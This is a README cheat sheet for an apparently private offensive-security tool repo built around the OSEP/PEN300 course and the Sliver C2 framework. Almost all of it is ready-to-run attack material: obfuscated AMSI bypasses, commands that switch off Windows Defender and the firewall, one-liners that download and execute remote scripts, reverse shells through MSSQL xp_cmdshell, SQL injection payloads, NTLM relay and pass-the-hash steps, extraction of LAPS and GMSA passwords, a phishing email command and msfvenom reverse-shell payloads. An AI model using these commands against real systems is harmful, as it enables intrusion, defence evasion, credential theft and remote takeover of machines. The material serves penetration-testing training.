# ToolLibrary 

This project was started as a means to better organize each repo along with a how-to guide for generalized execution and execution through a C2 agent. In my case, the agent of choice was Sliver Interactive Beacons and much of the exploits are specific to the OSEP or PEN300 course. 

As such, this repo is still in private and will not be published as some of the exploits are challenge or exercise specific. 


- [1. Tunneling (Ligolo-NG)](#Tunneling---Ligolo-NG)
- [2. Map The Network](#Map-The-Network)
- [3. AMSI-Bypass](#AMSI-Bypass)
- [4. Windows Privilege Escalation](#Windows-Privilege-Escalation)
- [5. Windows Defender/Firewall Commands](#Windows-Defender-and-Firewall-Commands)
- [6. Useful Basic Commands](#Useful-Basic-Commands)
- [7. Escalate to SYSTEM via Schedule Task](#Escalate-to-SYSTEM-via-Schedule-Task)
- [8. Enable RDP and RestrictedAdmin](#Enable-RDP-and-RestrictedAdmin)
- [9. TCP Port Redirection via powercat](#TCP-Port-Redirection-via-powercat)
- [10. MSSQL Useful Queries](#MSSQL-Useful-Queries)
- [11. MSSQLPwner](#MSSQLPwner)
- [12. PowerUPSQL](#PowerUPSQL)
- [13. NTLM Relay](#NTLM-Relay)
- [14. Domain Enumeration](#Domain-Enumeration)
- [15. TGS Abuse](#TGS-Abuse)
- [16. BloodyAD Cheetsheet](#BloodyAD-Cheetsheet)
- [17. MSFVenom Payload Generation Cheetsheet](#MSFVenom-Payload-Generation-Cheetsheet)

# Tunneling - Ligolo-NG

We will use the powershell shellcode runner in ToolLibrary/Tunnels/ligolo.ps1

1. Make sure to convert agent.exe of ligolo to shellcode: 
- `donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe` 

2. Make sure you are running as x64 bit process before running: 
- Powershell - `[Environment]::Is64BitProcess`
- CMD - `set p` (Should show PROCESSOR_ARCHITECTURE=AMD64)

If you are in 32bit process, run: `%windir%\sysnative\WindowsPowerShell\v1.0\powershell.exe` - then check again.

3. Make sure to change line number 14 to point to your IP Address:

- `$url = "http://192.168.45.168/agent.bin" # CHANGE ME`

4. Invoke it: `iex(iwr http://192.168.45.173:443/ligolo.ps1 -UseBasicParsing)`

Finally you should see an agent connected to your ligolo server.


# Map The Network
- `nxc smb 172.16.125.0/24 --log hosts.txt` (for windows hosts)

- `nxc ssh 172.16.125.0/24 --log hosts.txt` (for linux hosts)

Automation for `/etc/hosts` file: 
```
netexec smb 172.16.149.0/24 --log hosts.txt && sed -i 's/x64//g' hosts.txt && cat hosts.txt | awk '{print $9,$11,$11"."$21}' | sed 's/(domain://g' | sed 's/)//g' | uniq | sort -u | tr '[:upper:]' '[:lower:]' | sudo tee -a /etc/hosts
```

# Windows Privilege Escalation
- [PrivescCheck](https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1): `Invoke-PrivescCheck -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML`
- [winPEAS](https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASps1/winPEAS.ps1): `iex(iwr http://192.168.45.196/winPEAS.ps1 -useb)`

# AMSI-Bypass

- Windows 10/11:
```
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1)
```
- Windows 10:
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
```
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```
```
(([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
```

# Windows Defender and Firewall Commands

| Description                                        | Command                                                                               |
| -------------------------------------------------- | ------------------------------------------------------------------------------------- |
| Disable firewall - New way                         | netsh advfirewall set allprofiles state off                                         |
| Disable Firewall - Old way                         | netsh firewall set opmode disable                                                   |
| Disable firewall service (can only run as SYSTEM?) | net stop mpssvc                                                                     |
| Current firewall profile                           | netsh advfirewall show currentprofile                                               |
| Firewall rules                                     | netsh advfirewall firewall show rule name=all                                       |
| Show open ports                                    | netstat -ano                                                                       |
| Network Information                                | ipconfig /all                                                                      |
| EXE Exclusion                                      | Add-MpPreference -ExclusionExtension ".exe"                                         |
| Turn off Virus & Threat Detection                  | Set-MpPreference -DisableRealtimeMonitoring $true                                   |
| Remove all definitions                             | cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all |


# Useful Basic Commands

### Run command as another user:
- `Invoke-RunasCs amit 'Password123!' 'powershell iex(iwr http://192.168.45.185/rev.txt -usebasicparsing)' -ForceProfile -CreateProcessFunction 2 -BypassUac`

- `runas.exe /netonly /user:final.com\nina cmd.exe`

```bash
# Sliver runas (windows only) run process in context of designated user
runas --username --process --args (arguments for process) [--password] [--domain]
```

### Set up SMB server (file transfer):
- `smbserver.py share $(pwd) -smb2support -username kali -password password` 

- On Victim: `net use \\192.168.45.227\share /U:kali password` 

- Copy files: `copy <FILENAME> \\192.168.45.227\share`

### Locate local/proof files
- `tree /f /a C:\Users`

- `Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -in "proof.txt", "local.txt", "secret.txt" }`

### Send email with attachment (Phishing)
- `swaks --to jobs@cowmotors-int.com --from amit@rocks.com --header "Subject: My CV" --body "Attached my CV to this mail, thank you!" --attach @rev.doc --server 192.168.157.201`

# Enumeration

Search for SSH keys in Users directory:
- `Get-ChildItem -Path C:\Users -Include .ssh -Directory -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Get-ChildItem -Path $_.FullName -File -Recurse -ErrorAction SilentlyContinue }`

Search for interesting files:
- `Get-ChildItem -Path C:\Users -Include *.xml,*.txt,*.ps1,*.pdf,*.xls,*.xlsx,*.doc,*.docx,id_rsa,authorized_keys,*.exe,*.log -File -Recurse -ErrorAction SilentlyContinue`

Powershell History Path:
- `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

Sticky Notes Path:
- `C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\`

# Enable RDP and RestrictedAdmin
*Note: Enabling RestrictedAdmin allow us to perform PassTheHash with RDP.*

Using command prompt (Local): 

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f && reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0 && netsh firewall set service remoteadmin enable && netsh firewall set service remotedesktop enable
```

Using netexec (Remote):
```
netexec smb db01 -u administrator -H faf3185b0a608ce2f8afb6f8d133f85b --local-auth -X 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f;reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0;netsh firewall set service remoteadmin enable;netsh firewall set service remotedesktop enable' --exec-method atexec
```

### RDP to host:

Password Auth: 
- `xfreerdp /v:172.16.231.221 /u:amit /p:'Password123!' /cert-ignore /compression +dynamic-resolution +clipboard`

NTLM Auth: 
- `xfreerdp /v:172.16.231.221 /u:amit /pth:'<NTLM HASH>' /cert-ignore /compression +dynamic-resolution +clipboard`

### atexec.py

- `atexec.py test.local/john:password123@10.10.10.1 whoami'`
- `atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 test.local/john@10.10.10.1 whoami`

# Escalate to SYSTEM via Schedule Task
- `schtasks /create /tn "SystemTask" /tr "powershell iex(iwr http://192.168.45.223/hollow.ps1 -useb)" /sc once /st 00:00 /ru SYSTEM`

- `schtasks /run /tn "SystemTask"`

### Dump SAM (Make sure session is running with SYSTEM privileges)
- Background the meterpreter session with `bg`.
- `use post/windows/gather/hashdump`
- `set SESSION <Session Number>`
- `run`

# TCP Port Redirection via powercat

Mostly be used for NTLM Relay attacks when the authentication cannot reach our attacking machine, so the idea is to redirect it from a random host in the network (where we have admin privileges) to our attacking machine.

first step is to allow inbound and outbound connections to our victim machine on port 445:

### Using CMD:
```
netsh advfirewall firewall add rule name="Allow Port 445 Inbound" dir=in action=allow protocol=TCP localport=445
netsh advfirewall firewall add rule name="Allow Port 445 Outbound" dir=out action=allow protocol=TCP remoteport=445
```

### Using Powershell:
```
New-NetFirewallRule -DisplayName "Allow Port 445 Inbound" -Direction Inbound -Protocol TCP -LocalPort 445 -Action Allow
New-NetFirewallRule -DisplayName "Allow Port 445 Outbound" -Direction Outbound -Protocol TCP -RemotePort 445 -Action Allow
```

Now, we will need to disable the SMB port on the victim: 

*Note: Run one by one in CMD, no powershell!)*

    sc config LanmanServer start= disabled
    sc stop LanmanServer
    sc stop srv2
    sc stop srvnet

Next, we will invoke powercat.ps1: `iex(iwr http://192.168.45.223/powercat.ps1 -useb)` and run:
- `powercat -l -p 445 -r tcp:<PARROT IP>:445 -rep`

Once it's running we can check if the victim is listening on port 445: `netstat -anto | findstr 445`

Last step is to perform the Relay - !REMEMEBER! not to our attacking box, but to the victim machine! and see the callback to our machine on port 445 tunneled from the victim!

# MSSQL Useful Queries
*Note: privileges in a database might differ, check every access you can accomplish, which mean using the local administrator, machine account, etc.*

Injection POC - time delay:
- `test'; WAITFOR DELAY '0:0:5'-- -`

In case of Injection, we can try enable xp_cmdshell and get code execution (might need to URL encode the payload, even as POST data):
- `test'; EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -`

List databases:
- `select * from sys.databases;`

List tables inside specific database:
- `select * from <DATABASE NAME>..sysobjects WHERE xtype = 'U';`

List columns inside specific table :
- `select * from wordpress..wp_users;`

Update specific column:
- `update wordpress..wp_users set user_pass = '$P$BAyzjPk37CdiX/e/XxwB9I7wZgBG8Q/' WHERE user_login = 'admin';`

Impersonate SA on linked server and execute commands:
```
-- Switch to sa only if needed
EXECUTE AS LOGIN = 'sa';
EXEC('sp_configure ''show advanced options'',1; RECONFIGURE') AT SQL03;
exec ('EXEC sp_configure ''xp_cmdshell'',1 RECONFIGURE') at SQL03
EXEC('xp_cmdshell ''powershell whoami''') AT SQL03;
```

# MSSQLPwner
Enumerate MSSQL instance:
- `mssqlpwner -hashes ':d38a856d6126f47a58ebfa34a4b70fef' 'WEB01$'@db01 -windows-auth enumerate`

Get interactive prompt:
- `mssqlpwner -hashes ':d38a856d6126f47a58ebfa34a4b70fef' 'WEB01$'@db01 -windows-auth interactive`

Execute direct query:
- `mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"`

Execute xp_cmdshell (automation is done by the tool, it will try every variation to get it done):
- `exec -command_execution_method (xp_cmdshell/sp_oacreate) "powershell iex(iwr http://192.168.45.196/hollow.ps1 -useb)"`

Execute command through custom assembly:
- `mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname`

Retrieving password from the linked server:
- `mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrieve-password`

# PowerUPSQL

| Purpose | Command |
|---------|---------|
| Get MSSQL Instances in the current domain | Get-SQLInstanceDomain |
| Test for access on the instances | Get-SQLInstanceDomain \| Get-SQLConnectionTestThreaded -Verbose |
| Get INFO about the accessible instances | Get-SQLInstanceDomain \| Get-SQLServerInfo -Verbose |
| Search Database Links | Get-SQLServerLink -Instance dcorp-mssql -Verbose |
| Get nested links using PowerUpSQL | Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose |
| Query nested links using OpenQuery | select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')') |
| Enable xp_cmdshell on remote link | EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "eu-sql" |
| Execute commands using PowerUpSQL | Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" \| ft |
| Execute command manually (GUI) | select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')') |
| Reverse Shell | Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'powershell iex(New-Object Net.WebClient).DownloadString(''http://172.16.100.26/Invoke-PowershellTcp.ps1'')'" \| ft |
| Audit for issues | Invoke-SQLAudit -Verbose |
| Escalate to sysadmin | Invoke-SQLEscalatePriv -Verbose -Instance SQLServer1 |
| Execute xp_dirtree | sqlcmd -Q "xp_dirtree '\\\\10.10.14.51\\test'" |

# NTLM Relay:
*Notes: three tools involved: Responder,ntlmrelayx and mssqlpwner/impacket, also, make sure the user authenticating to us have local admin access to the desired target*

Prepare BASE64 command to execute:

```
$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.229/rev.txt') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText
```

<ins>Set up NTLM Relay</ins>:

Command Execution: 

- `ntlmrelayx.py --no-http-server -smb2support -t 192.168.156.6 -c 'command/base64 blob here'`

SAM Dump: 

- `ntlmrelayx.py --no-http-server -smb2support -t smb://172.16.192.152`

<ins>Fire up Responder</ins>

- `sudo responder -I tun0 -A` (make sure SMB is turned OFF in /etc/responder/Responder.conf)

<ins>Trigger SMB authentication</ins>:

MSSQLPwner: 

- `mssqlpwner user:pass@<MSSQL INSTANCE IP> -windows-auth ntlm-relay -relay-method (xp_dirtree/xp_subdirs/xp_fileexist) <OUR ATTACKING MACHINE IP>`

impacket: 

- `xp_dirtree \\192.168.45.196\blabla`                                                                                                                            |

# Domain Enumeration

## Domain/DC Information
- `Get-NetDomain` - Query basic domain info  
- `Get-NetDomain -Domain megacorp.com` - Query basic info of trusted domain.  
- `Get-NetDomainController` - Information of the DC, IP Included.  
- `Get-NetDomainController -Domain megacorp.com` - Information about another DC, IP Included.  
- `Get-DomainSID` - Query the domain SID.
- `Get-NetGroupMember -GroupName "Enterprise Admins" -Domain moneycorp.local` - Query specific group information including their SID.
- `Get-DomainPolicy` - Query domain policy information.

## Domain Users/Groups Enumeration

-   `Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount` - Basic user enabled info
-   `Get-NetUser | select cn` - Get the whole domain users.
-   `Get-NetUser | select cn,description` - All user's description.
-   `Get-DomainUser -PreauthNotRequired -verbose | select samaccountname` - ASREPRoastable users. (GetNPUsers)
-   `Get-NetUser -SPN` - Kerberoastable users
-   `Get-DomainSPNTicket -SPN "MSSQLSvc/sqlserver.targetdomain.com"` - Query SPN hashes (for offline cracking mostly).
-   `Get-UserProperty -Properties description` - Descriptions of all domain users.
-   `Find-UserField -SearchField Description -SearchTerm "password"` - Search for the `password` string in the user's description.
-   `Get-NetGroup -GroupName *admin*` - Show all groups has the `admin` word in it.
-   `Get-NetGroupMember -Identity "Domain Admins" -Recurse` - Get all domain admins in the domain.

## Domain Computers Enumeration
- `Get-NetComputer` - Query all domain joined computers in the current domain.
- `Get-NetComputer -FullData` - Query all the machines in the domain with full properties.
- `Get-NetComputer -FullData | select name` - Query NetBIOS computer names (not FQDN).
- `Get-NetComputer -OperatingSystem "*Server 2016*"` - Query specific operating system computers.
- `Get-NetComputer -Ping` - Check alive hosts.

## Sessions
- `Get-NetSession -ComputerName sv-dc01` - Query active sessions on the remote computer.  
- `Get-NetLoggedOn -ComputerName svclient08` - Query logged on users from a target computer.
- `Get-LoggedonLocal -ComputerName megacorp.com` - Query locally logged users on a computer.

## Enumerate GPO applied in specific OU
- `Get-NetGPO -GPOname "{AB..81}"` - Query GPO applied on an OU.
- `Get-DomainOU -OUName StudentMachines | %{Get-NetComputer -ADSpath $_}` - Query computers in specific OU.
- `Get-DomainGPO | select displayname`  - Show all domain GPO's name.

## Enumerate Trusts

- `Get-NetForestDomain -Verbose` - All domains in the current forest.
- `Get-NetDomainTrust` - Map the trusts of the current domain.
- `Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust` - Enumerate trusts for a trusting domain.
- `Get-NetGPOGroup` -  Get GPO's which use Restricted Groups or groups.xml for interesting users.

# TGS Abuse

|     Service Type          |   Service Silver Tickets |
| ------------------------- | ------------------------ |
| WMI                       | Host, RPCSS              |
| PowerShell Remoting       | HOST,HTTP                |
| WinRM                     | HOST,HTTP,WINRM          |
| Scheduled Tasks           | HOST                     |
| Windows File Share/PSEXEC | CIFS                     |
| Golden Tickets            | krbtgt                   |
| LDAP operations, included DCSync | LDAP              |

# BloodyAD Cheetsheet

| **Purpose**                                           | **Command**                                                                                                                              |
|-------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|
| Retrieve User Information                             | bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username                                                     |
| Add User To Group                                     | bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add                                      |
| Change Password                                       | bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password                                      |
| Give User GenericAll Rights                           | bloodyAD --host $dc -d $domain -u $username -p $password add genericAll $DN $target_username                                             |
| WriteOwner                                            | bloodyAD --host $dc -d $domain -u $username -p $password set owner $target_group $target_username                                        |
| Read GMSA Password                                    | bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username --attr msDS-ManagedPassword                        |
| Enable a Disabled Account                             | bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE                                  |
| Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag           | bloodyAD --host $dc -d $domain -u $username -p $password add uac $target_username -f TRUSTED_TO_AUTH_FOR_DELEGATION                    |
| Read LAPS Password                                    | bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime |
| Read LAPS Password (Kerberos Auth)                    | KRB5CCNAME=ted.ccache bloodyAD -k --dc-ip "192.168.202.120" --host dc03.infinity.com -d "infinity.com" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime |

# MSFVenom Payload Generation Cheetsheet
| Name                            | Payload                                                                                                                                                                                                                        |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Sliver 64bit Staged             | msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.227 LPORT=8064 EXITFUNC=thread -f csharp |
| Sliver 32bit Staged             | msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.227 LPORT=8086 EXITFUNC=thread -f csharp |
| msfvenom DLL 64bit              | msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.227 LPORT=8064 -f dll > reverse_64bit.dll |
| msfvenom DLL 32bit              | msfvenom -p windows/reverse_tcp -a x86 LHOST=192.168.45.227 LPORT=8064 -f dll > reverse_32bit.dll |
| HTA Reverse Shell               | msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.227 LPORT=8064 -f hta-psh -o evil.hta |
| Linux - x86 reverse shell       | msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.227 LPORT=443 -f elf > shell-x86.elf |
| Linux - x64 reverse shell       | msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.227 LPORT=443 -f elf > shell-x64.elf |

